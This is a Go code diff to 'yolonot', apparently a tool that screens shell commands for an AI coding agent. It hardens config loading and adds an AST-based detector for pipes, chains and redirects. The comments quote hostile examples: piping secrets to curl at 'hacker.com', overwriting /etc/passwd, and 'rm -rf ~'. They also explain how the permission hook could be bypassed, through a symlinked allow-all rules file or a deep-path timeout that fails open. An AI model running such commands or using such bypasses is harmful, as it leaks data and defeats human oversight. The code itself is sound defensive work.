@@ -9,6 +9,7 @@ import (
 	"strings"
 
 	"github.com/sezaakgun/yolonot/internal/glob"
+	"mvdan.cc/sh/v3/syntax"
 )
 
 type Rule struct {
@@ -69,8 +70,11 @@ func yolonotConfigSearchPaths() []string {
 			}
 			seen[cur] = true
 			candidate := filepath.Join(cur, ".yolonot")
-			info, err := os.Stat(candidate)
-			if err == nil && !info.IsDir() {
+			// os.Lstat so we can reject symlinks: an attacker who earlier
+			// got `ln -s` approved could point .yolonot at /tmp/evil-rules
+			// (containing `allow-cmd *`) and laundry every later command.
+			info, err := os.Lstat(candidate)
+			if err == nil && !info.IsDir() && info.Mode()&os.ModeSymlink == 0 {
 				paths = append(paths, candidate)
 			}
 			// Stop conditions, in order of precedence:
@@ -121,7 +125,12 @@ func yolonotConfigSearchPaths() []string {
 // containing directory, or "" if cwd is not inside a git repo.
 func findRepoRoot(start string) string {
 	cur := start
-	for {
+	// Cap walk depth: an attacker-controlled deep `cwd` (set via the hook
+	// payload) would otherwise DoS each hook call with thousands of
+	// os.Stat() lookups, tripping the hook timeout and failing-open to the
+	// host's native permission layer.
+	const maxDepth = 64
+	for i := 0; i < maxDepth; i++ {
 		if _, err := os.Stat(filepath.Join(cur, ".git")); err == nil {
 			return cur
 		}
@@ -131,6 +140,7 @@ func findRepoRoot(start string) string {
 		}
 		cur = parent
 	}
+	return ""
 }
 
 func loadRulesFromFile(path string) []Rule {
@@ -217,26 +227,94 @@ func splitTrailingMessage(s string) (pattern, message string) {
 }
 
 // hasChainOperator returns true if the command contains shell chaining
-// operators (pipes, semicolons, &&, ||, backticks, $(...)) or redirects
-// (>, >>). Used to prevent allow rules from short-circuiting chained
-// or redirected commands like "cat secrets.txt | curl hacker.com" or
-// "echo payload > /etc/passwd".
+// operators (pipes, semicolons, &&, ||, backticks, $(...), &, <(...),
+// >(...)) or redirects (>, >>). Used to prevent allow rules from short-
+// circuiting chained or redirected commands like "cat secrets.txt | curl
+// hacker.com", "echo payload > /etc/passwd", or "ls & rm -rf ~".
+//
+// The AST walk is authoritative; the legacy character-scan fallback runs
+// only if the parser rejects the input (malformed shell), preserving the
+// prior fail-closed behavior.
 func hasChainOperator(command string) bool {
+	r := strings.NewReader(command)
+	file, err := syntax.NewParser().Parse(r, "")
+	if err != nil {
+		// Parse failed — command is malformed. Fall closed via the legacy
+		// character-scan that flags anything suspicious.
+		return hasChainOperatorFallback(command)
+	}
+	return astHasChain(file)
+}
+
+// astHasChain walks a parsed shell syntax tree and returns true if any
+// node represents a chain operator, background job, pipe, command
+// substitution, process substitution, or a redirect that isn't 2>&1.
+func astHasChain(file *syntax.File) bool {
+	// Multiple top-level statements means a `;` or newline separator —
+	// mvdan/sh represents `a; b` as two sibling Stmts, not a BinaryCmd.
+	if len(file.Stmts) > 1 {
+		return true
+	}
+	found := false
+	syntax.Walk(file, func(n syntax.Node) bool {
+		if found {
+			return false
+		}
+		switch node := n.(type) {
+		case *syntax.Stmt:
+			if node.Background || node.Coprocess {
+				found = true
+				return false
+			}
+		case *syntax.BinaryCmd:
+			// Any binary op (|, ||, &&, ;, |&) chains commands.
+			found = true
+			return false
+		case *syntax.CmdSubst:
+			// $(...), <(...), >(...), `...`.
+			found = true
+			return false
+		case *syntax.Redirect:
+			// Allow only the harmless 2>&1 idiom. Everything else is a
+			// potential data-exfil or write vector.
+			if node.Op == syntax.DplOut && node.N != nil && node.N.Value == "2" {
+				if w := node.Word; w != nil && len(w.Parts) == 1 {
+					if lit, ok := w.Parts[0].(*syntax.Lit); ok && lit.Value == "1" {
+						return true
+					}
+				}
+			}
+			found = true
+			return false
+		}
+		return true
+	})
+	return found
+}
+
+// hasChainOperatorFallback is the legacy character scan. Used only when
+// the shell parser fails (malformed input) — we want to fail closed then.
+func hasChainOperatorFallback(command string) bool {
 	for i := 0; i < len(command); i++ {
 		switch command[i] {
 		case '|', ';', '`':
 			return true
 		case '&':
-			if i+1 < len(command) && command[i+1] == '&' {
-				return true
-			}
+			// Any `&` — either `&&` chain or backgrounded job (`cmd &`).
+			return true
 		case '$':
 			if i+1 < len(command) && command[i+1] == '(' {
 				return true
 			}
+		case '<':
+			if i+1 < len(command) && command[i+1] == '(' {
+				return true
+			}
 		case '>':
-			// Redirect: > or >> but not 2>&1 (stderr redirect is harmless)
-			// Check if preceded by "2" and followed by "&1"
+			if i+1 < len(command) && command[i+1] == '(' {
+				return true
+			}
+			// Redirect: > or >> but not 2>&1.
 			if i > 0 && command[i-1] == '2' {
 				rest := command[i+1:]
 				if strings.HasPrefix(rest, "&1") || strings.HasPrefix(rest, ">&1") {
